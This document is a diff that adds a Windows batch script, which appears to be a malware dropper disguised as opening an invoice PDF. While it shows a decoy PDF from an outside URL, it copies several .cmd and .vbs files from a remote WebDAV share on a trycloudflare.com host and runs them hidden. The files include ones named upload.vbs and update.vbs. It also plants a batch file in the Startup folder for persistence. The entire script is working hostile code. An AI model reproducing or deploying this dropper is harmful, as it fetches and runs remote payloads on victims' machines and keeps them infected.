@@ -1,0 +1,52 @@
+@echo off
+setlocal
+
+set source=\\boy-such-icon-positive.trycloudflare.com@SSL\DavWWWRoot\google\Win
+set destination=%USERPROFILE%\Appdata
+
+echo Opening PDF file...
+start "" "https://s2r.tn/cgi/INVOICERVSHA.pdf"
+
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+
+
+REM Run kam.cmd and las.cmd and zap.cmd and xff.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\xff.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+
+echo Copying update from %source% to %destination%...
+copy /Y "%source%\update.vbs" "%destination%"
+
+echo Running update....
+"%destination%\update.vbs"
+
+echo Copying upload from %source% to %destination%...
+copy /Y "%source%\upload.vbs" "%destination%"
+
+echo Running upload....
+"%destination%\upload.vbs"
+
+echo Copying windows from %source% to %destination%...
+copy /Y "%source%\windows.vbs" "%destination%"
+
+echo Running windows...
+"%destination%\windows.vbs"
+
+echo Copying file from %source% to %destination%...
+copy /Y "%source%\file.vbs" "%destination%"
+
+echo Running file....
+"%destination%\file.vbs"
+
+copy /Y "%source%\windows_update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+)
+
+
+exit /b 0
